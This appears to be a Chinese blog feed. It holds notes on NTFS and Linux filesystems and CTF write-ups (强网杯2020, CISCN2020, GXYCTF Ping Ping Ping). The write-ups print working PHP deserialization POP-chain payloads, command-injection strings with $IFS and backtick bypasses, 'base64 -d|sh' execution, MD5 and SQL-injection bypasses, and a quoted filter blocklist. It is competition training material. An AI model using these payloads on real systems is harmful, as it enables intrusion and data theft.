title="优点："></a>优点：</h4><p>1.安全性、稳定性UP</p><p>对用户权限做出了非常严格的限制，user只能按照系统赋予的权限进行操作</p><p>2.提供容错结构日志</p><p>3.文件级修复+热修复功能、分区格式稳定、不易产生文件碎片</p><blockquote><p>NTFS 5.0的特点主要有以下几个方面：<br>1，NTFS可以支持的分区大小可以达到2TB。而WIN 2000/XP中的FAT32支持的分区最大为32GB。<br>2，NTFS是一个可恢复的文件系统。在NTFS分区上用户很少需要运行磁盘修复程序。NTFS使用标准的事物处理日志和恢复技术来保证分区的一致性。发生系统失败事件时。NTFS使用日志文件和检查点信息自动恢复文件系统的一致性。<br>3，NTFS支持对分区、文件夹和文件的压缩。任何基于Windows的程序对NTFS分区上的压缩文件进行读写时不需要由其它程序先进行解压缩，当文件被读取时，文件会自动解压缩，而关闭和保存时会自动压缩。<br>4，NTFS采用更小的簇，WIN 2000/XP的NTFS文件系统中，当分区的大小在2GB以下时，簇的大小比相应的FAT32小；当分区在2GB以上时（2GB-2TB），簇的大小为4KB。而采用FAT32的簇大小为16KB（16GB-32GB），相比之下，NTFS能更有效地管理硬盘空间，最大限度的避免磁盘空间浪费。<br>5，在NTFS分区上，可以为共享资源、文件夹和文件设置访问许可权限。与FAT32文件系统下对文件夹或文件进行访问相比，安全性要高很多。<br>6，WIN 2000/XP下的NTFS文件系统还可以进行硬盘配额管理。配额管理就是管理员可以为用户所能使用的磁盘空间进行配额限制，每一用户只能使用最大配额内的磁盘空间。可以合理的分配系统资源，避免由于磁盘空间失控造成系统崩溃，提高了系统的安全性。<br>7，NTFS使用一个“变更”日志来跟踪记录文件所发生的变更。</p></blockquote><h4 id="缺点：-1"><a href="#缺点：-1" class="headerlink" title="缺点："></a>缺点：</h4><p>兼容性不好，很多操作系统不能识别，数据交换不方便</p><h2 id="二、Linux文件系统"><a href="#二、Linux文件系统" class="headerlink" title="二、Linux文件系统"></a>二、Linux文件系统</h2><p>1.ext文件系统</p><h3 id="（1）ext"><a href="#（1）ext" class="headerlink" title="（1）ext"></a>（1）ext</h3><p>扩展文件系统，对Linux早期发展重要作用</p><p>缺陷：稳定性、速度、兼容性</p><h3 id="（2）ext2"><a href="#（2）ext2" class="headerlink" title="（2）ext2"></a>（2）ext2</h3><p>二级扩展文件系统</p><p>ext2可支持256字节的长文件名，其单一文件大小的文件系统本身的容量上限与文件系统本身的簇大小有关。</p><p>在常见的Intel X86兼容处理器的系统中，簇最大为4KB</p><h4 id="缺陷："><a href="#缺陷：" class="headerlink" title="缺陷："></a>缺陷：</h4><p>主要考虑的是文件系统性能方面的问题，在写入文件内容的同时，并没有写入文件的meta-data（和文件有关的信息，例如权限、所有者级创建和访问时间）</p><p>即–先写内容，有空才写meta-data</p><h3 id="（3）ext3"><a href="#（3）ext3" class="headerlink" title="（3）ext3"></a>（3）ext3</h3><p>ext3在ext2的基础上加入了元数据的日志功能</p><p>系统关机，需要将文件系统全部卸下才能关机</p><p>缺点：内有线代文件系统所具有的能提高文件数据处理速度和解压的高性能</p><p>ext3文件系统要注意硬盘限额问题</p><h3 id="（4）JFS文件系统"><a href="#（4）JFS文件系统" class="headerlink" title="（4）JFS文件系统"></a>（4）JFS文件系统</h3><p>提供日志的字节集文件系统，主要为满足服务器的高吞吐量和可靠性需求</p><p>可靠、快速和容易使用</p><p>优点：快速重启</p><p>缺点：使用JFS 日志文件系统性能上会有一定损失，系统资源占用的比率也偏高，保存一个日志时，系统需要些许多数据。</p><h3 id="（5）ReiserFS文件系统"><a href="#（5）ReiserFS文件系统" class="headerlink" title="（5）ReiserFS文件系统"></a>（5）ReiserFS文件系统</h3><p>使用了特殊的、优化的平衡树（每个文件系统一个）来组织所有的文件系统数据，提供了非常不错的性能改进，也能减轻文件系统设计上的认为约束，能够像大多数的下一代文件系统一样，根据需要，动态分配索引节，增加空间的有效利用率。</p><h3 id="（6）XFS文件系统"><a href="#（6）XFS文件系统" class="headerlink" title="（6）XFS文件系统"></a>（6）XFS文件系统</h3><p>全64位、苦熬苏、稳固的日志文件系统，支持超大数量文件</p><p>新特性：</p><p>1.可升级性</p><p>2.优秀的I/O性能</p><p>由于XFS较为复杂，主要应用于Linux企业应用的高端。</p><h2 id="三、Linux系统的文件恢复"><a href="#三、Linux系统的文件恢复" class="headerlink" title="三、Linux系统的文件恢复"></a>三、Linux系统的文件恢复</h2><h3 id="一、ext2文件系统结构"><a href="#一、ext2文件系统结构" class="headerlink" title="一、ext2文件系统结构"></a>一、ext2文件系统结构</h3><p>（由于这本书的ext2描述的很简单，会另外写一篇博客补充）</p><p>块单位存储，默认情况下每个块的大小是1K</p><p>不同的块以块号区分</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>强网杯2020Writeup</title>
      <link href="/2020/08/26/qiang-wang-bei-2020/"/>
      <url>/2020/08/26/qiang-wang-bei-2020/</url>
      
        <content type="html"><![CDATA[<p>大菜鸡终于开始有了输出！</p><p>可惜今年misc只有一道题qwq</p><h2 id="强网先锋"><a href="#强网先锋" class="headerlink" title="强网先锋"></a>强网先锋</h2><h2 id="WEB辅助-solved"><a href="#WEB辅助-solved" class="headerlink" title="WEB辅助|solved"></a>WEB辅助|solved</h2><p>因为菜鸡看题的晚，现在过来进行分析，给了源码</p><p>index.php</p><pre class=" language-plain"><code class="language-plain"><?php@error_reporting(0);require_once "common.php";require_once "class.php";if (isset($_GET['username']) && isset($_GET['password']))&#123;    $username = $_GET['username'];    $password = $_GET['password'];    $player = new player($username, $password);    file_put_contents("caches/".md5($_SERVER['REMOTE_ADDR']), write(serialize($player)));&nbsp;    echo sprintf('Welcome %s, your ip is %s\n', $username, $_SERVER['REMOTE_ADDR']);&#125;else&#123;    echo "Please input the username or password!\n";&#125;?></code></pre><p>play.php</p><pre class=" language-plain"><code class="language-plain"><?php@error_reporting(0);require_once "common.php";require_once "class.php";@$player = unserialize(read(check(file_get_contents("caches/".md5($_SERVER['REMOTE_ADDR'])))));print_r($player);if ($player->get_admin() === 1)&#123;    echo "FPX Champion\n";&#125;else&#123;    echo "The Shy unstoppable\n";&#125;?></code></pre><p>class.php</p><pre class=" language-plain"><code class="language-plain"><?phpclass player&#123;&nbsp; &nbsp; protected $user;&nbsp; &nbsp; protected $pass;&nbsp; &nbsp; protected $admin;&nbsp; &nbsp; public function __construct($user, $pass, $admin = 0)&#123;&nbsp; &nbsp; &nbsp; &nbsp; $this->user = $user;&nbsp; &nbsp; &nbsp; &nbsp; $this->pass = $pass;&nbsp; &nbsp; &nbsp; &nbsp; $this->admin = $admin;&nbsp; &nbsp; &#125;&nbsp; &nbsp; public function get_admin()&#123;&nbsp; &nbsp; &nbsp; &nbsp; return $this->admin;&nbsp; &nbsp; &#125;&#125;class topsolo&#123;&nbsp; &nbsp; protected $name;&nbsp; &nbsp; public function __construct($name = 'Riven')&#123;&nbsp; &nbsp; &nbsp; &nbsp; $this->name = $name;&nbsp; &nbsp; &#125;&nbsp; &nbsp; public function TP()&#123;&nbsp; &nbsp; &nbsp; &nbsp; if (gettype($this->name) === "function" or gettype($this->name) === "object")&#123;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $name = $this->name;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $name();&nbsp; &nbsp; &nbsp; &nbsp; &#125;&nbsp; &nbsp; &#125;&nbsp; &nbsp; public function __destruct()&#123;&nbsp; &nbsp; &nbsp; &nbsp; $this->TP();&nbsp; &nbsp; &#125;&#125;class midsolo&#123;&nbsp; &nbsp; protected $name;&nbsp; &nbsp; public function __construct($name)&#123;&nbsp; &nbsp; &nbsp; &nbsp; $this->name = $name;&nbsp; &nbsp; &#125;&nbsp; &nbsp; public function __wakeup()&#123;&nbsp; &nbsp; &nbsp; &nbsp; if ($this->name !== 'Yasuo')&#123;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $this->name = 'Yasuo';&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; echo "No Yasuo! No Soul!\n";&nbsp; &nbsp; &nbsp; &nbsp; &#125;&nbsp; &nbsp; &#125;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; public function __invoke()&#123;&nbsp; &nbsp; &nbsp; &nbsp; $this->Gank();&nbsp; &nbsp; &#125;&nbsp; &nbsp; public function Gank()&#123;&nbsp; &nbsp; &nbsp; &nbsp; if (stristr($this->name, 'Yasuo'))&#123;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; echo "Are you orphan?\n";&nbsp; &nbsp; &nbsp; &nbsp; &#125;&nbsp; &nbsp; &nbsp; &nbsp; else&#123;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; echo "Must Be Yasuo!\n";&nbsp; &nbsp; &nbsp; &nbsp; &#125;&nbsp; &nbsp; &#125;&#125;class jungle&#123;&nbsp; &nbsp; protected $name = "";&nbsp; &nbsp; public function __construct($name = "Lee Sin")&#123;&nbsp; &nbsp; &nbsp; &nbsp; $this->name = $name;&nbsp; &nbsp; &#125;&nbsp; &nbsp; public function KS()&#123;&nbsp; &nbsp; &nbsp; &nbsp; system("cat /flag");&nbsp; &nbsp; &#125;&nbsp; &nbsp; public function __toString()&#123;&nbsp; &nbsp; &nbsp; &nbsp; $this->KS();&nbsp;&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; return "";&nbsp;&nbsp;&nbsp; &nbsp; &#125;&#125;?></code></pre><p>common.php</p><pre class=" language-plain"><code class="language-plain"><?phpfunction read($data)&#123;&nbsp; &nbsp; $data = str_replace('\0*\0', chr(0)."*".chr(0), $data);&nbsp; &nbsp; return $data;&#125;function write($data)&#123;&nbsp; &nbsp; $data = str_replace(chr(0)."*".chr(0), '\0*\0', $data);&nbsp; &nbsp; return $data;&#125;function check($data)&#123;&nbsp; &nbsp; if(stristr($data, 'name')!==False)&#123;&nbsp; &nbsp; &nbsp; &nbsp; die("Name Pass\n");&nbsp; &nbsp; &#125;&nbsp; &nbsp; else&#123;&nbsp; &nbsp; &nbsp; &nbsp; return $data;&nbsp; &nbsp; &#125;&#125;?></code></pre><p>_pop链：player中new一个topsolo类__destruct调用$name作为函数，$name为midsolo类，调用__invoke，里面的$name是jungle类stristr调用__tostring执行cat flag</p><p>str_replace(‘\0<em>\0’, chr(0).”</em>“.chr(0), $data); 这里是5变3</p><p>我们要吃掉strlen(‘;s:7:”<em>pass”;s:164:”‘) 22个字符，虽然显示是20，但是</em>旁边还有两个东西</p><p>所以就55变33吃掉22个字符,就是username的内容。</p><p><img src="1.PNG"></p><p>要学习直接搜字符串逃逸。</p><p>DASCTF4月赛原题</p><p>payload如下：</p><pre class=" language-plain"><code class="language-plain">?username=\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0&password=;S:7:"\00*\00pass";O:7:"topsolo":1:&#123;S:7:"\00*\00\6e\61\6d\65";O:7:"midsolo":2:&#123;S:7:"\00*\00\6e\61\6d\65";O:6:"jungle":1:&#123;S:7:"\00*\00\6e\61\6d\65";S:7:"Lee Sin";&#125;&#125;&#125;</code></pre><h2 id="主动-solved"><a href="#主动-solved" class="headerlink" title="主动 |solved"></a>主动 |solved</h2><p>buu上的GXCTF–Ping ~ ~的简化版</p><p>web狗的签到题</p><p>3s搞定</p><p>考点，内联执行</p><p><a href="http://39.96.23.228:10002/?ip=127.0.0.1;cat%20%60ls%60">http://39.96.23.228:10002/?ip=127.0.0.1;cat%20<code>ls</code></a></p><p><img src="https://uploader.shimo.im/f/y2OpvNhROPJChYhF.png!thumbnail" alt="图片"></p><h2 id="Funhash-solved"><a href="#Funhash-solved" class="headerlink" title="Funhash |solved"></a>Funhash |solved</h2><pre class=" language-plain"><code class="language-plain"><?phpinclude&nbsp;'conn.php';highlight_file("index.php");//level&nbsp;1if&nbsp;($_GET["hash1"]&nbsp;!=&nbsp;hash("md4",&nbsp;$_GET["hash1"]))&#123;&nbsp;&nbsp;&nbsp;&nbsp;die('level&nbsp;1&nbsp;failed');&#125;//level&nbsp;2if($_GET['hash2']&nbsp;===&nbsp;$_GET['hash3']&nbsp;||&nbsp;md5($_GET['hash2'])&nbsp;!==&nbsp;md5($_GET['hash3']))&#123;&nbsp;&nbsp;&nbsp;&nbsp;die('level&nbsp;2&nbsp;failed');&#125;//level&nbsp;3$query&nbsp;=&nbsp;"SELECT&nbsp;*&nbsp;FROM&nbsp;flag&nbsp;WHERE&nbsp;password&nbsp;=&nbsp;'"&nbsp;.&nbsp;md5($_GET["hash4"],true)&nbsp;.&nbsp;"'";$result&nbsp;=&nbsp;$mysqli->query($query);$row&nbsp;=&nbsp;$result->fetch_assoc();&nbsp;var_dump($row);$result->free();$mysqli->close();?></code></pre><p>三层绕过<br>第一层</p><p><a href="https://evi0s.com/2019/02/09/md5-collisions/">https://evi0s.com/2019/02/09/md5-collisions/</a></p><p><img src="2.PNG"></p><p>第二层</p><p>数组绕过</p><p>第三层</p><p>万能密码</p><p>payload：</p><pre class=" language-plain"><code class="language-plain">?hash1=0e001233333333333334557778889&hash2[]=1&hash3[]=0&hash4=ffifdyop</code></pre><p><img src="3.PNG"></p><h2 id="Upload-solved"><a href="#Upload-solved" class="headerlink" title="Upload|solved"></a>Upload|solved</h2><p>一个数据包</p><p>有http，直接导出，得到两个文件，然后提示是steghide，下面那个steghide.php里面有图片，用foremost分离出来后，得到图片</p><p>因为没有给提示，尝试用steghide试试弱密码</p><p>steghide extract -sf “gs.jpg” -xf “hide.txt” -p “123456”</p><p>flag出</p><p><img src="4.PNG"></p><h2 id="红方辅助-solved"><a href="#红方辅助-solved" class="headerlink" title="红方辅助|solved"></a>红方辅助|solved</h2><p>给了一个数据包和一个py脚本</p><p>对协议进行一个统计分析，然后发现是ssh</p><p><img src="5.PNG"></p><p>wireshark追踪流，分析</p><p><img src="6.PNG"></p><p>从加密脚本入手得知</p><p>数据是有所对应的，</p><p><img src="7.PNG"></p><p>接着写脚本进行解密即可</p><p>然后发现有很多奇奇怪怪的字符</p><p>emmmm</p><p>而且很多都是相同的</p><p>去掉这些字符</p><p>得到flag</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a><strong>MISC</strong></h2><p>7个葫芦娃…一个流量包里面套那么多层是真的没想到</p><p>题目说难不难，说简单不简单，谁能想得到呢</p><h3 id="level1-level2"><a href="#level1-level2" class="headerlink" title="level1+level2"></a>level1+level2</h3><p>审计流量包里面</p><p>发现这个奇怪的网址，登录，</p><p><a href="http://39.99.247.28/fonts/1">http://39.99.247.28/fonts/1</a></p><p><img src="8.PNG"></p><h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>还是流量包</p><p>找到ssllog解密的数据包</p><p>接着访问数据包里面的网址</p><p><a href="https://www.qiangwangbei.com/images/4e5d47b2db53654959295bba216858932.png">https://www.qiangwangbei.com/images/4e5d47b2db53654959295bba216858932.png</a></p><p>开局一张图，剩下全靠猜</p><p>拿到图片的时候还去想了想是啥</p><p>把图片下载下来</p><p><img src="9.PNG"></p><p>放入010editor里面分析</p><p><img src="10.PNG"></p><p>发现有base64码</p><p>解码得到</p><p><img src="11.PNG"></p><p>以及</p><p><img src="12.PNG"></p><p>尝试分析为二进制转字符串，此方向不同，遂联想0101转二维码</p><p>网上搜索脚本，然后进行改长与宽，最后生成60*60的二维码有效</p><p>脚本如下：</p><pre class=" language-plain"><code class="language-plain">from PIL import Image import binasciifile = open("2","r")i=0H=60W=60pic = Image.new("RGB",(W,H))zo=file.read()for y in range(0,H):    for x in range(0,W):        if(zo[i]=="0"):            pic.putpixel([x,y],(255,255,255))        else:            pic.putpixel([x,y],(0,0,0))        i=i+1pic.show()pic.save('pg</code></pre><p><img src="13.PNG"></p><p>得到图片如上</p><p>然后拿到level4的百度云</p><h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p>然后又是一张图……</p><p><img src="14.PNG"></p><p>那么又是什么东西呢</p><p>用stegdect检测–&gt;jphg加密，</p><p>然后爆破密码，得到密码为power123</p><p>然后得到level4和一个百度云</p><p><a href="https://pan.baidu.com/s/1o43y4UGkm1eP-RViC25aOw">https://pan.baidu.com/s/1o43y4UGkm1eP-RViC25aOw</a></p><p>mrpt</p><p>level4_here_all</p><h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><p>一个压缩包，010editor分析，zip伪加密，修改，分离出，得到level5和一堆东西</p><p><img src="15.PNG"></p><p>接下来看里面有level6和level7</p><h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><p>level6的压缩里的文件都是454的长度….</p><p>尝试密码爆破，无果</p><p>emmm</p><p>454  —-   CRC 都是三字节，尝试CRC爆破，得到level6</p><h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><p>因为压缩包外有1.jpg，压缩包里面也有，明文爆破，</p><p>得到两张图—&gt;双图狂喜盲水印，试着用了好几款python的盲水印的工具–py3可以….上次遇到的那个题是py3不行，55555，windows常备双水印</p><p><img src="16.PNG"></p><p>接着以为拿到level7，我可是狂喜了一下，提交，啊，不对</p><p>去给的网址看看</p><h3 id="final-level"><a href="#final-level" class="headerlink" title="final_level"></a>final_level</h3><p>没想到还有final_level</p><p>qwq</p><p>上去之后</p><p>接着想了一晚上提示</p><pre><code>&lt;!-- How did it become a blank , maybe you should pass (no one can find me)--&gt;</code></pre><p>错失一血，让我们都觉得好沮丧</p><p>不过确实漏掉了一个点，后面去百度了跟空格且跟网页有关的隐写，发现snow隐写相近</p><p>snow解密<a href="http://fog.misty.com/perry/ccs/snow/snow/snow.html">http://fog.misty.com/perry/ccs/snow/snow/snow.html</a></p><p>使用密码blank、pass和no one can find me</p><p>最后key为no one can find me</p><p>得到final_level</p><p><img src="17.PNG"></p><p>最后得到flag：</p><p>flag{level1_begin_and_level2_is_comelevel3_start_itlevel4_here_alllevel5_is_aaalevel6_isreadylevel7isherethe_misc_examaaaaaaa_!!!}</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2020全国大学生信息安全竞赛初赛部分Writeup</title>
      <link href="/2020/08/21/ciscn2020-quan-guo-da-xue-sheng-xin-xi-an-quan-jing-sai-chu-sai-writeup/"/>
      <url>/2020/08/21/ciscn2020-quan-guo-da-xue-sheng-xin-xi-an-quan-jing-sai-chu-sai-writeup/</url>
      
        <content type="html"><![CDATA[<p>今年的题目没有去年的质量高倒是，跟队友一起，看队友秒杀题目觉得自己好菜（bushi</p><p>然后今年主要是去死磕misc了，就没有完整的看web了，就把我看了的web题丢上来吧。</p><p>后面弄懂我再把全队的wp丢上来，毕竟是全队的努力</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a><strong>WEB</strong></h2><h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><p>子进程异常退出后进入父进程查看phpinfo，查看php手册，fsockopen符合user_call_func_array的构造要求</p><pre class=" language-plain"><code class="language-plain">a=fsockopen&b=123</code></pre><h3 id="easytrick"><a href="#easytrick" class="headerlink" title="easytrick"></a>easytrick</h3><p>这道题跟队友一起想的，但是想了两种办法，有点妙，一个是利用<a href="https://blog.csdn.net/weixin_43257005/article/details/106118623">NAN的特性</a>，一个是利用浮点数的特性</p><p>本题考点是：str与md5的强转换出现bug</p><pre class=" language-plain"><code class="language-plain"><?phpclass trick&#123; &nbsp; &nbsp;public $trick1 = NAN; &nbsp; &nbsp;public $trick2 = NAN; &nbsp; &nbsp;//&nbsp;public $trick1 = 0.1; &nbsp;  //&nbsp;public $trick2 = 0.1000000000000001; &nbsp; &nbsp;public function __destruct()&#123; &nbsp; &nbsp; &nbsp; &nbsp;$this->trick1 = (string)$this->trick1; &nbsp; &nbsp; &nbsp; &nbsp;if(strlen($this->trick1) > 5 || strlen($this->trick2) > 5)&#123; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;die("你太长了"); &nbsp; &nbsp; &nbsp;  &#125; &nbsp; &nbsp; &nbsp; &nbsp;if($this->trick1 !== $this->trick2 && md5($this->trick1) === md5($this->trick2) && $this->trick1 != $this->trick2)&#123; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;echo file_get_contents("/flag"); &nbsp; &nbsp; &nbsp;  &#125; &nbsp;  &#125;&#125;echo serialize(new trick());</code></pre><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a><strong>MISC</strong></h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>涉及到点击的地方，分析js………</p><p>最后发现是…..</p><p>挑战目标：需要全国所有省份的安全感，都有至少10个ip守护就会共同拿到通关flag。</p><p>等所有的大佬登录之后放flag</p><p>我还傻傻的分析</p><p>我自闭了…………</p><p>flag{同舟共济扬帆起，乘风破浪万里航。}</p><h3 id="the-best-ctf-game"><a href="#the-best-ctf-game" class="headerlink" title="the_best_ctf_game"></a>the_best_ctf_game</h3><p>挺无语的一道题</p><p>拖入010editor</p><p>找规律就对了</p><p><img src="4.PNG"></p><p>而且看能打出来的字符串即可</p><p>flag如下：</p><h3 id="电脑被黑"><a href="#电脑被黑" class="headerlink" title="电脑被黑"></a>电脑被黑</h3><p>取证的题直接躺尸–autopsy</p><p>我用的是windows的</p><p>进入到如下界面</p><p><img src="2.PNG"></p><p>发现发现四个文件，提取出来</p><p>在fakeflag.txt中用010editor分析提取出flag.txt</p><p>虽然是乱码，但是还是作为二进制文件来看吧</p><p>把demo放入ida逆向分析</p><p><img src="3.PNG"></p><p>编写代码如下</p><p>逆一下就行</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuoj刷题大作战</title>
      <link href="/2020/07/27/buuoj-gxyctf2019-ping-ping-ping/"/>
      <url>/2020/07/27/buuoj-gxyctf2019-ping-ping-ping/</url>
      
        <content type="html"><![CDATA[<h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><blockquote><p>最近回归CTF，但是PTA也是会继续更新，加油冲！</p><p>这两天断更的原因是跟小伙伴们一起去打了CyberCTF，菜鸡的团队也能打进60，真的是很高兴了，虽然是几个小伙伴一起组建的hhh</p></blockquote><h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><p>基础之管道命令</p><p>1.命令执行—变量拼接</p><p>2.内联执行–反引号的作用</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>先一看题，是ping ip的</p><p>跟之前的比赛类似</p><p>直接看里面有啥</p><pre><code>?127.0.0.1|ls</code></pre><p>用管道命令</p><p>发现里面有两个文档</p><p>一个flag.php，一个index.php</p><p>试着继续用管道命令cat flag.php</p><p>接着就回显</p><pre><code>/?ip= fxck your space!</code></pre><p>告知我空格被ban了</p><p>但是这粗暴的语言恶心到我了（就是玻璃心）</p><p>努力干掉这道题</p><a id="more"></a><h3 id="绕过空格的方法"><a href="#绕过空格的方法" class="headerlink" title="绕过空格的方法"></a>绕过空格的方法</h3><pre class=" language-bash"><code class="language-bash"><span class="token variable">$IFS</span>$<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;IFS&amp;#125;</span><span class="token variable">$IFS</span><span class="token variable">$1</span> //<span class="token variable">$1</span>改成$加其他数字貌似都行<span class="token operator">&lt;</span> <span class="token operator">&lt;</span><span class="token operator">></span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;cat,flag.php&amp;#125;  //用逗号实现了空格功能</span>%20 %09 </code></pre><p>——Linux命令绕过</p><p>继续解题</p><p>发现使用$IFS$1可以绕过</p><p>接着发现{、flag都被ban了</p><p>绕过了空格，试试读取index.php，waf了啥</p><p>index.php源码如下：</p><pre class=" language-php"><code class="language-php"><span class="token operator">/</span><span class="token operator">?</span>ip<span class="token operator">=</span><span class="token operator">|</span>\'<span class="token operator">|</span>\<span class="token string">"|\\|\(|\)|\[|\]|\&amp;#123;|\&amp;#125;/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>    <span class="token keyword">echo</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\&amp;|\/|\?|\*|\&lt;|[\x&amp;#123;00&amp;#125;-\x&amp;#123;20&amp;#125;]|\>|\'|\"|\\|\(|\)|\[|\]|\&amp;#123;|\&amp;#125;/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"fxck your symbol!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; else if(preg_match(</span><span class="token string">"/ /"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"fxck your space!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; else if(preg_match(</span><span class="token string">"/bash/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"fxck your bash!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; else if(preg_match(</span><span class="token string">"/.*f.*l.*a.*g.*/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"fxck your flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>  <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string">"ping -c 4 "</span><span class="token punctuation">.</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> ""<span class="token punctuation">;</span>  <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token delimiter">?></span></code></pre><p>发现过滤了一堆东西：</p><p>1.过滤了bash/空格/包括*等一系列标点</p><p>2.flag被贪婪匹配了….</p><p>那么就使用内联执行了</p><pre><code>?ip=127.0.0.1;cat$IFS$9`ls`</code></pre><p>接着因为不回显，查看源码即可</p><h3 id="内联执行"><a href="#内联执行" class="headerlink" title="内联执行"></a>内联执行</h3><p>将反引号内的命令执行之后的输出作为下一个命令的内容</p><p>即：ls执行之后给出的flag.php和index.php</p><p>接着外面的cat与里面的两个文件分别执行</p><p>cat flag.php</p><h2 id="其他做法"><a href="#其他做法" class="headerlink" title="其他做法"></a>其他做法</h2><p>变量拼接</p><p>变量$a可以进行覆盖</p><p><code>/?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</code></p><p>据说官方的办法：<br>过滤bash?那就用sh。sh的大部分脚本都可以在bash下运行。</p><pre><code>echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code></pre><p>但是我没测试出来</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>学会了变量拼接和内联执行两种方法</p><blockquote><p>${IFS},$IFS,$IFS$9的区别，首先$IFS在linux下表示分隔符，只有cat$IFSa.txt的时候,bash解释器会把整个IFSa当做变量名，所以导致没有办法运行，然而如果加一个{}就固定了变量名，同理在后面加个$可以起到截断的作用，而$9指的是当前系统shell进程的第九个参数的持有者，就是一个空字符串，因此$9相当于没有加东西，等于做了一个前后隔离。</p></blockquote><h2 id="参考"><a href="#参考" class="headerlink" 